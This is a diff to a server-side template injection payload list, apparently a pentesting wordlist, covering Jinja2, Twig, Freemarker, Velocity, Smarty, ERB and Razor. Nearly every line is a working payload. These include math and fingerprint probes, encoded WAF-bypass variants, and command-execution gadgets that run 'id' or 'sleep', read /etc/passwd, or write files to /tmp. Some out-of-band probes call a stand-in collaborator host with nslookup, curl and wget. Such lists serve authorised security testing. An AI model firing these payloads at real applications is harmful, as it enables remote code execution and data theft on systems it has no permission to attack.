@@ -1,346 +1,118 @@
-# ==================== BASIC MATH DETECTION ====================
-{{7*7}}
-${7*7}
-${{7*7}}
-{{7*'7'}}
-#{7*7}
-*{7*7}
-{7*7}
-<${{7*7}}>
-{{7*7}}}
-{{7*7}}]
-{{7*7}}"
-{{7*7}}'
-${7*7}
-${{7*7}}
-#{7*7}
-{{7*7}}
-*{7*7}
-{7*7}
-{{7*7}}
-<%= 7*7 %>
-{{7*7}}
-{{7*7}}
-{{7*7}}
+# ==================== SSTI UNIVERSAL DETECTION (MASTER) ====================
+# Every engine family + how to confirm you hit a template engine.
+# Workflow: math probe -> echo probe -> engine fingerprint -> RCE (ssti-to-rce-2026.txt).
 
-# ==================== ADVANCED MATH BYPASS ====================
+# ==================== MATH PROBE (ALWAYS FIRST, 49 = HIT) ====================
+{{7*7}}
+${7*7}
+${{7*7}}
+#{7*7}
+*{7*7}
+@{7*7}
+~{7*7}
+[[${7*7}]]
+[(7*7)]
+<%= 7*7 %>
+{{7*'7'}}
+{7*7}
+<${7*7}>
+{{7*7}} <?=7*7?>
+# If 7*7 -> 49 renders, go straight to engine fingerprint below.
+# Engine syntax recall:
+#   Jinja2/Twig       {{7*7}}          Freemarker/EL   ${7*7}  #{7*7}
+#   Thymeleaf         ${..} [[..]] [(..)] *{..}          Velocity   #set($x=7*7)${x}
+#   Smarty            {7*7} math + {%*.*%}/{/*.*/}       ERB(Ruby)  <%= 7*7 %>
+#   Pug/Jade          #{7*7}            DOT(Razor)      @(7*7) @{7*7}
+
+# ==================== ECHO / EXPR EVAL PROBE (confirms dynamic eval) ====================
 {{7*7}}00
-{{7*7}}%00
-{{7*7}}%0a
-{{7*7}}%0d
-{{7*7}}%09
-{{7*7}}%20
-{{7*7}}#
-{{7*7}}//
-{{7*7}}/*{{7*7}}*/
 ${7*7}00
-${7*7}%00
 ${{7*7}}00
-${{7*7}}%0a
 #{7*7}00
 <%= 7*7 %>00
+@(7*7)00
+# renders "4900"? -> template evaluates expression -> SSTI confirmed.
 
-# ==================== IDENTIFICATION PAYLOADS ====================
-{{config}}
+# ==================== IDENTIFICATION PAYLOADS (name your engine) ====================
+{{config}}                                      # Jinja2 (Flask/Django/Tornado apps)
 {{self}}
-{{_self}}
-${.vars}
-{{app.request.server.all}}
-{$smarty.version}
-{{_self.env.registerUndefinedFilterCallback("exec")}}
-{{config.__class__.__init__.__globals__}}
-{{''.__class__.__mro__[2].__subclasses__()}}
-${"freemarker.template.utility.Execute"?new()}
-#set($x=$class.inspect("java.lang.Runtime"))
-{{dump(app)}}
-{{=7*7}}
-{{=7*7}}
-{=7*7}
-{{7*7}}
-{{7*7}}
-
-# ==================== JINJA2 DETECTION ====================
-{{7*7}}
-{{config}}
-{{self}}
-{{''.__class__}}
-{{''.__class__.__mro__}}
-{{''.__class__.__mro__[2].__subclasses__()}}
-{{url_for.__globals__}}
-{{get_flashed_messages.__globals__}}
-{{request.application.__globals__}}
-{{cycler.__init__.__globals__}}
-{{joiner.__init__.__globals__}}
-{{namespace.__init__.__globals__}}
-{{lipsum.__globals__}}
-{{range.__globals__}}
-{{dict.__globals__}}
-{{config.items()}}
-{{config.__class__.__init__}}
-{{config.__class__.__dict__}}
-{{''.__class__.__bases__}}
-{{''.__class__.__base__}}
-
-# ==================== TWIG DETECTION ====================
-{{7*7}}
-{{_self}}
+{{_self}}                                       # Twig
 {{_self.env}}
-{{_self.env.registerUndefinedFilterCallback}}
-{{_self.env.getFilter}}
-{{_self.env.setLoader}}
-{{_context}}
-{{app.request.server.all}}
-{{constant('_self')}}
-{{dump(app)}}
-{{var_dump(app)}}
+{{app.request.server.all}}                      # Twig/Symfony
+{$smarty.version}                               # Smarty
+${.vars} ${.data_model} ${.version}             # Freemarker
+#set($x=$class.inspect("java.lang.Runtime"))    # Velocity
+{{dump(app)}}                                   # Twig debugging
+{{url_for.__globals__}}                         # Jinja2+Flask
+{{cycler.__init__.__globals__}}                 # Jinja2 (SSTI classic)
+${T(java.lang.Runtime)}                         # Java EL / Thymeleaf / OGNL
+<%= File.open('/etc/passwd').read %>            # ERB/Ruby
+@(ViewData)                                     # Razor/.NET
 
-# ==================== FREEMARKER DETECTION ====================
-${7*7}
-${.vars}
-${.data_model}
-${.main}
-${.version}
-${.current_template_name}
-${.output_encoding}
-${.locale}
-${.time_zone}
-${.url_escaping_charset}
-${.template_language}
-${.template_name}
-${.node}
-${.node_name}
-${.node_type}
-${.node_namespace}
-${"freemarker.template.utility.Execute"?new()}
+# ==================== PARAMETER LOCATIONS TO TEST ====================
+/search?q=PAYLOAD
+/profile?name=PAYLOAD&bio=x
+/api/v1/preview?template=PAYLOAD
+POST /render     {"template":"PAYLOAD"}
+Cookie: username=PAYLOAD
+X-Forwarded-For/X-Forwarded-Host: PAYLOAD
+User-Agent: PAYLOAD
+Referer: PAYLOAD
 
-# ==================== VELOCITY DETECTION ====================
-#set($x=7*7)${x}
-#set($x=$x.class)
-#set($x=$x.forName("java.lang.Runtime"))
-#set($x=$x.getRuntime())
-#set($x=$x.exec("id"))
-${x}
-#set($str=$class.inspect("java.lang.String"))
-#set($ex=$str.valueOf($class.inspect("java.lang.Runtime").getRuntime().exec("id")))
-
-# ==================== SMARTER DETECTION ====================
-{$smarty.now}
-{$smarty.version}
-{$smarty.const}
-{$smarty.config}
-{$smarty.ldelim}
-{$smarty.rdelim}
-{php}phpinfo();{/php}
-{literal}system('id'){/literal}
-{include file="input"}
-
-# ==================== ERB (RUBY) DETECTION ====================
-<%= 7*7 %>
-<%= system("id") %>
-<%= `id` %>
-<%= File.open('/etc/passwd').read %>
-<%= ENV['PATH'] %>
-<%= request.env %>
-<%= @user.name %>
-<%= user.name %>
-
-# ==================== JADE/PUG DETECTION ====================
-#{7*7}
-#{7*7}
-#{function(){return 7*7}()}
-#{{7*7}}
-#{7*7}00
-
-# ==================== HANDLEBARS DETECTION ====================
-{{7*7}}
-{{7*7}}
-{{{7*7}}}
-{{> 7*7}}
-{{> (7*7)}}
-{{#> 7*7}}
-{{! 7*7}}
-
-# ==================== DOT (C#) DETECTION ====================
-@(7*7)
-@(7*7)
-@{7*7}
-@{
-    var x = 7*7;
-    @x
-}
-@if(7*7==49){@true}
-
-# ==================== BLIND SSTI TIME DELAY ====================
-{{7*7}}
-{{sleep(5)}}
-{{config.__class__.__init__.__globals__['os'].popen('sleep 5').read()}}
-{{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test','w').write('test')}}
-{{self.__init__.__globals__.os.system('sleep 5')}}
-{{url_for.__globals__.os.system('sleep 5')}}
-{{get_flashed_messages.__globals__.os.system('sleep 5')}}
-{{cycler.__init__.__globals__.os.system('sleep 5')}}
-{{joiner.__init__.__globals__.os.system('sleep 5')}}
-
-# ==================== BLIND SSTI DNS CALLBACK ====================
-{{config.__class__.__init__.__globals__['os'].popen('nslookup YOUR-COLLABORATOR.burpcollaborator.net').read()}}
-{{''.__class__.__mro__[2].__subclasses__()[40]('|nslookup YOUR-COLLABORATOR.burpcollaborator.net').read()}}
-{{self.__init__.__globals__.os.popen('ping -c 5 YOUR-COLLABORATOR.burpcollaborator.net')}}
-{{url_for.__globals__.os.system('curl http://YOUR-COLLABORATOR.burpcollaborator.net')}}
-{{cycler.__init__.__globals__.os.popen('wget http://YOUR-COLLABORATOR.burpcollaborator.net')}}
-
-# ==================== WAF BYPASS ENCODED ====================
-%7B%7B7%2A7%7D%7D
-%24%7B7%2A7%7D
-%7B%7Bconfig%7D%7D
-%7B%7Bself%7D%7D
+# ==================== ENCODED / WAF-BYPASS VARIANTS ====================
+%7B%7B7%2A7%7D%7D              # URL encoded {{7*7}}
+%24%7B7%2A7%7D                 # ${7*7}
 %7B%7B''.__class__.__mro__%5B2%5D.__subclasses__()%7D%7D
-%7B%7Bconfig.__class__.__init__.__globals__%5B'os'%5D.popen('id').read()%7D%7D
-%7B%7B7*7%7D%7D%00
-%7B%7B7*7%7D%7D%0a
-%7B%7B7*7%7D%7D%09
-%7B%7B7*7%7D%7D%20
-%7B%7B7*7%7D%7D%23
-
-# ==================== DOUBLE ENCODED BYPASS ====================
-%257B%257B7%252A7%257D%257D
-%2524%257B7%252A7%257D
-%257B%257Bconfig%257D%257D
-%257B%257Bself%257D%257D
-%257B%257B''.__class__.__mro__%255B2%255D.__subclasses__()%257D%257D
-
-# ==================== COMMENT BYPASS ====================
-{{/*7*7*/}}
-{{#7*7#}}
-{{# 7*7 #}}
-{{!-- 7*7 --}}
-{{/* 7*7 */}}
-{{=7*7=}}
-{{!7*7}}
-{{7*7<!-- -->}}
-{{7*7<!---->}}
-{{7*7<#-- -->}}
-
-# ==================== WHITESPACE BYPASS ====================
-{{7*7}}
-{{7*7}}
-{{7*7}}
-{{7*7}}
-{{7*7}}
-{{7*7}}
-{{7*7}}
-{{7*7}}
-{{7*7}}
-{{7*7}}
-
-# ==================== NEWLINE BYPASS ====================
+%257B%257B7%252A7%257D%257D    # DOUBLE url encoded
+&#123;&#123;7*7&#125;&#125;      # HTML entities
+&#x7B;&#x7B;7*7&#x7D;&#x7D;
+{{/*7*7*/}}                     # comment-wrapped
+{{# 7*7 #}}                     # Jinja comment
+{{!-- 7*7 --}}                  # Handlebars comment
+{{7*7<!-- -->}}                 # HTML comment injection
+{{7*7}}%00                      # null byte trailer
+{{7*7}}%0a                      # newline trailer
+{{7*7}}%0d
+{{7*7}}%09                      # tab trailer
+{{7*7}}%20                      # space trailer
+{{7*7}}#
 {%
 7*7
-%}
-{{
-7*7
-}}
-<%
-7*7
-%>
-<%
-=7*7
-%>
+%}                             # newline inside delimiters
 {{
 =7*7
 }}
+{{7*7}}{{7*7}}                 # double hit boosts response-size diff
 
-# ==================== CASE VARIATION BYPASS ====================
-{{7*7}}
-{{7*7}}
-{{7*7}}
-{{7*7}}
-{{7*7}}
-{{7*7}}
-{{7*7}}
-{{7*7}}
+# ==================== TIME-BASED BLIND PROBE (4-7s delay = HIT) ====================
+{{sleep(5)}}                                    # Jinja
+{{config.__class__.__init__.__globals__['os'].popen('sleep 5').read()}}
+${T(java.lang.Thread).sleep(5000)}              # Java EL/Thymeleaf
+#set($x=$class.inspect("java.lang.Runtime").getRuntime().exec("sleep 5"))  # Velocity
+<%= system("sleep 5") %>                        # ERB
+{php}sleep(5);{/php}                            # PHP Smarty tag mode
+${"sleep".execute(5)}                           # (engine-agnostic attempt)
+{{url_for.__globals__.os.system('sleep 5')}}    # Jinja+Flask
+{{cycler.__init__.__globals__.os.system('sleep 5')}}
+{{joiner.__init__.__globals__.os.system('sleep 5')}}
+{{namespace.__init__.__globals__.os.system('sleep 5')}}
 
-# ==================== HTML ENTITY BYPASS ====================
-&#123;&#123;7*7&#125;&#125;
-&#x7B;&#x7B;7*7&#x7D;&#x7D;
-&#123;&#123;config&#125;&#125;
-&#x7B;&#x7B;self&#x7D;&#x7D;
-&#123;&#123;''.__class__&#125;&#125;
+# ==================== DNS / OUT-OF-BAND BLIND PROBE ====================
+{{config.__class__.__init__.__globals__['os'].popen('nslookup YOUR-COLLABORATOR.com').read()}}   # Jinja
+{{''.__class__.__mro__[2].__subclasses__()[40]('nslookup YOUR-COLLABORATOR.com').read()}}
+{{cycler.__init__.__globals__.os.popen('nslookup YOUR-COLLABORATOR.com')}}
+{{url_for.__globals__.os.system('curl http://YOUR-COLLABORATOR.com')}}
+${T(java.lang.Runtime).getRuntime().exec('nslookup YOUR-COLLABORATOR.com')}                       # Java EL
+#set($x=$class.inspect("java.lang.Runtime").getRuntime().exec("nslookup YOUR-COLLABORATOR.com")) # Velocity
+<%= system("nslookup YOUR-COLLABORATOR.com") %>                                                  # ERB
+{php}system("nslookup YOUR-COLLABORATOR.com");{/php}                                              # Smarty
 
-# ==================== URL PATH SSTI ====================
-/{{7*7}}
-/${7*7}
-/${{7*7}}
-/{{7*7}}/
-/{{7*7}}.html
-/{{7*7}}?x=y
-/prefix{{7*7}}suffix
-/{{7*7}}/admin
-/admin/{{7*7}}/edit
-/api/{{7*7}}/user
+# ==================== FILE-CREATION MARKER (for file-write codebases) ====================
+{{config.__class__.__init__.__globals__['os'].popen('touch /tmp/ssti_pwn').read()}}
+{{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/ssti.txt','w').write('pwn')}}
+<%= system("touch /tmp/ssti") %>
+${system("touch /tmp/ssti")}   # (FreeMarker-compatible style probe)
 
-# ==================== JSON PARAMETER SSTI ====================
-{"name":"{{7*7}}"}
-{"name":"${7*7}"}
-{"name":"${{7*7}}"}
-{"template":"{{7*7}}"}
-{"query":"{{7*7}}"}
-{"data":"<%= 7*7 %>"}
-
-# ==================== XML PARAMETER SSTI ====================
-<name>{{7*7}}</name>
-<name>${7*7}</name>
-<name>${{7*7}}</name>
-<template>{{7*7}}</template>
-<data><%= 7*7 %></data>
-
-# ==================== HEADER SSTI ====================
-X-Forwarded-For: {{7*7}}
-X-Forwarded-Host: {{7*7}}
-User-Agent: {{7*7}}
-Referer: {{7*7}}
-Cookie: name={{7*7}}
-Cookie: session={{7*7}}
-X-Custom-Header: {{7*7}}
-
-# ==================== MULTI-PARAMETER SSTI ====================
-?name={{7*7}}&email=test@test.com
-?user={{7*7}}&pass={{7*7}}
-?search={{7*7}}&page={{7*7}}
-?q={{7*7}}&sort={{7*7}}
-?template={{7*7}}&layout={{7*7}}
-
-# ==================== ADVANCED BYPASS (VARIABLE ASSIGNMENT) ====================
-{% set x=7*7 %}{{x}}
-{% with x=7*7 %}{{x}}{% endwith %}
-{% do x=7*7 %}{{x}}
-${(7*7)::()}
-${(7*7)?string}
-${(7*7)?c}
-${(7*7)?upper}
-${(7*7)?lower}
-{{(7*7)|safe}}
-{{(7*7)|escape}}
-{{(7*7)|default(49)}}
-{{(7*7)|length}}
-{{(7*7)|string}}
-{{(7*7)|int}}
-{{(7*7)|float}}
-
-# ==================== RAPID DETECTION (FULL SCAN) ====================
-{{7*7}}${7*7}${{7*7}}<%=7*7%>#{7*7}*{7*7}{7*7}{{7*7}}<%=7*7%><%7*7%><%=7*7%><%#7*7%><%7*7%><%7*7%><%7*7%><%=7*7%><%=7*7%><%=7*7%>
-
-# ==================== 2026 LATEST BYPASS ====================
-{{7*7}}?{{7*7}}
-{{7*7}}#{{7*7}}
-{{7*7}}&{{7*7}}
-{{7*7}}+{{7*7}}
-{{7*7}}/{{7*7}}
-{{7*7}}\{{7*7}}
-{{7*7}}|{{7*7}}
-{{7*7}}.{{7*7}}
-{{7*7}}:{{7*7}}
-{{7*7}};{{7*7}}
-{{7*7}},{{7*7}}
-{{7*7}}!{{7*7}}
-{{7*7}}?{{7*7}}
-{{7*7}}~{{7*7}}
+# ==================== RAPID ONE-SHOT DETECTION LINE ====================
+# Inject this whole string -> any engine math will render 49:
+{{7*7}}${7*7}${{7*7}}#{7*7}<%= 7*7 %>@(7*7)#set($x=7*7)${x}
